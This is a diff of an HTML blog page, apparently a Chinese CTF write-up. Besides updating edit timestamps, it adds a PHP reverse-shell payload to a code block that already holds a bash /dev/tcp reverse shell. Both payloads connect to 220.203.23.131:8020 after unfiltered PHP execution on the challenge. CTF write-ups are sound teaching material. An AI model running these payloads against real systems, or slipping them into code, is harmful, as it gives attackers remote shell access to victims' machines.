@@ -31,7 +31,7 @@
 <meta property="og:image" content="c:\Users\51261\AppData\Roaming\Typora\typora-user-images\image-20260205182512279.png">
 <meta property="og:image" content="https://yk.jsdu.cn/20260205/44bea17cdcd52dd758102dba7162fe26.png">
 <meta property="article:published_time" content="2026-02-05T08:00:05.000Z">
-<meta property="article:modified_time" content="2026-02-05T10:56:31.821Z">
+<meta property="article:modified_time" content="2026-02-09T00:59:54.737Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -198,9 +198,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2026-02-05 16:00:05 / Modified: 18:56:31" itemprop="dateCreated datePublished" datetime="2026-02-05T16:00:05+08:00">2026-02-05</time>
+      <time title="Created: 2026-02-05 16:00:05" itemprop="dateCreated datePublished" datetime="2026-02-05T16:00:05+08:00">2026-02-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-02-09 08:59:54" itemprop="dateModified" datetime="2026-02-09T08:59:54+08:00">2026-02-09</time>
     </span>
 
   
@@ -216,7 +222,7 @@
 <span id="more"></span>
 
 <p>限制输入了8位字母，我这里输入的<code>11111111</code>，就可以进入到php代码执行界面，这里任意PHP代码都能执行，没有任何过滤。所以可以尝试反弹shell，这里可以用php来弹shell，也可以用bash。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash弹：</span><br><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/220.203.23.131/8020 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br><span class="line">php弹：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash弹：</span><br><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/220.203.23.131/8020 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br><span class="line">php弹：</span><br><span class="line">&lt;?php</span><br><span class="line">system(&#x27;php -r \&#x27;$sock=fsockopen(&quot;220.203.23.131&quot;,8020);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这里发现成功弹到shell:</p>
 <p><img src="https://yk.jsdu.cn/20260205/b4a668b4dab75c32824c93abc5c2416b.png" alt="php_online1"></p>
